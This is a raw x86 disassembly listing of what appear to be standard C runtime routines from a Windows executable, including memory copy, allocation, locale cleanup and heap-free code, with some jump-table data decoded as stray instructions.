  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
